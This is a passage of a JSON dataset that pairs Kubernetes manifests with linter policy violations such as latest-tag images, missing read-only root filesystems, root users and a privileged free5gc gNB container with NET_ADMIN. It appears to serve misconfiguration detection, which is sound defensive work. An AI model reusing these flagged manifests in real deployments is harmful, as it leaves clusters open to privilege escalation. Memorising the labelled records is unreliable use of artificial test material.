    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: test-certificate-signer\n  name: test-certificate-signer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: test-certificate-signer\n  template:\n    metadata:\n      labels:\n        k8s-app: test-certificate-signer\n    spec:\n      containers:\n      - image: dockerhub/test_certificate_signer:latest\n        imagePullPolicy: Always\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 400m\n        name: test-certificate-signer\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n        env:\n        - name: CERTIFICATE_NAMESPACE\n          value: https://cowin.gov.in/credentials/testCertificate/v1\n        - name: CERTIFICATE_BASE_URL\n          value: https://cowin.gov.in/test/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-certificate-signer\" is using an invalid container image, \"dockerhub/test_certificate_signer:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10906",
    "manifest_path": "data/manifests/the_stack_sample/sample_4190.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: test-certificate-signer\n  name: test-certificate-signer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: test-certificate-signer\n  template:\n    metadata:\n      labels:\n        k8s-app: test-certificate-signer\n    spec:\n      containers:\n      - image: dockerhub/test_certificate_signer:latest\n        imagePullPolicy: Always\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 400m\n        name: test-certificate-signer\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n        env:\n        - name: CERTIFICATE_NAMESPACE\n          value: https://cowin.gov.in/credentials/testCertificate/v1\n        - name: CERTIFICATE_BASE_URL\n          value: https://cowin.gov.in/test/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-certificate-signer\" does not have a read-only root file system"
  },
  {
    "id": "10907",
    "manifest_path": "data/manifests/the_stack_sample/sample_4190.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: test-certificate-signer\n  name: test-certificate-signer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: test-certificate-signer\n  template:\n    metadata:\n      labels:\n        k8s-app: test-certificate-signer\n    spec:\n      containers:\n      - image: dockerhub/test_certificate_signer:latest\n        imagePullPolicy: Always\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 400m\n        name: test-certificate-signer\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n        env:\n        - name: CERTIFICATE_NAMESPACE\n          value: https://cowin.gov.in/credentials/testCertificate/v1\n        - name: CERTIFICATE_BASE_URL\n          value: https://cowin.gov.in/test/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-certificate-signer\" is not set to runAsNonRoot"
  },
  {
    "id": "10908",
    "manifest_path": "data/manifests/the_stack_sample/sample_4190.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: test-certificate-signer\n  name: test-certificate-signer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: test-certificate-signer\n  template:\n    metadata:\n      labels:\n        k8s-app: test-certificate-signer\n    spec:\n      containers:\n      - image: dockerhub/test_certificate_signer:latest\n        imagePullPolicy: Always\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 400m\n        name: test-certificate-signer\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n        env:\n        - name: CERTIFICATE_NAMESPACE\n          value: https://cowin.gov.in/credentials/testCertificate/v1\n        - name: CERTIFICATE_BASE_URL\n          value: https://cowin.gov.in/test/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-certificate-signer\" has memory limit 0"
  },
  {
    "id": "10909",
    "manifest_path": "data/manifests/the_stack_sample/sample_4191.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-203\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10910",
    "manifest_path": "data/manifests/the_stack_sample/sample_4191.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-203\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10911",
    "manifest_path": "data/manifests/the_stack_sample/sample_4191.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-203\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10912",
    "manifest_path": "data/manifests/the_stack_sample/sample_4191.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-203\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10913",
    "manifest_path": "data/manifests/the_stack_sample/sample_4191.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-203\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10914",
    "manifest_path": "data/manifests/the_stack_sample/sample_4194.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: app\n  namespace: cnb-nodejs\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: cnb-nodejs\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cnb-nodejs])"
  },
  {
    "id": "10915",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"free5gc-ueransim-gnb\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "10916",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tcpdump\" is using an invalid container image, \"corfr/tcpdump\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10917",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"free5gc-ueransim-gnb\" does not have a read-only root file system"
  },
  {
    "id": "10918",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tcpdump\" does not have a read-only root file system"
  },
  {
    "id": "10919",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"free5gc-ueransim-gnb-466-11-000000010-sa\" not found"
  },
  {
    "id": "10920",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"free5gc-ueransim-gnb\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10921",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"free5gc-ueransim-gnb\" is privileged"
  },
  {
    "id": "10922",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"free5gc-ueransim-gnb\" is not set to runAsNonRoot"
  },
  {
    "id": "10923",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tcpdump\" is not set to runAsNonRoot"
  },
  {
    "id": "10924",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"free5gc-ueransim-gnb\" has cpu request 0"
  },
  {
    "id": "10925",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ueransim-gnb-466-11-000000010\n  labels:\n    app: free5gc-ueransim-gnb-466-11-000000010\n    nsi: '1'\n    mcc: '466'\n    mnc: '11'\n    nci: '000000010'\n    telecom: CHT\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: free5gc-ueransim-gnb-466-11-000000010\n  template:\n    metadata:\n      labels:\n        app: free5gc-ueransim-gnb-466-11-000000010\n        nsi: '1'\n        mcc: '466'\n        mnc: '11'\n        nci: '000000010'\n        telecom: CHT\n      annotations:\n        k8s.v1.cni.cncf.io/networks: free5gc-macvlan, free5gc-n3-466-11-000000010\n        free5gc-macvlan.free5gc.kubernetes.io/ip_address: 192.168.72.51\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/logical_switch: free5gc-n3-466-11-000000010\n        free5gc-n3-466-11-000000010.free5gc.ovn.kubernetes.io/ip_address: 10.201.100.3\n    spec:\n      securityContext:\n        runAsUser: 0\n        runAsGroup: 0\n      containers:\n      - name: free5gc-ueransim-gnb\n        image: black842679513/free5gc-ueransim:v3.1.5\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n        volumeMounts:\n        - name: free5gc-ueransim-gnb-466-11-000000010-config\n          mountPath: /UERANSIM/config\n        ports:\n        - containerPort: 4997\n          name: if-n1n2\n          protocol: UDP\n        - containerPort: 2152\n          name: if-n3\n          protocol: UDP\n      - name: tcpdump\n        image: corfr/tcpdump\n        command:\n        - /bin/sleep\n        - infinity\n      serviceAccountName: free5gc-ueransim-gnb-466-11-000000010-sa\n      volumes:\n      - name: free5gc-ueransim-gnb-466-11-000000010-config\n        configMap:\n          name: free5gc-ueransim-gnb-466-11-000000010-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tcpdump\" has cpu request 0"
  },
  {
    "id": "10926",
    "manifest_path": "data/manifests/the_stack_sample/sample_4196.yaml",
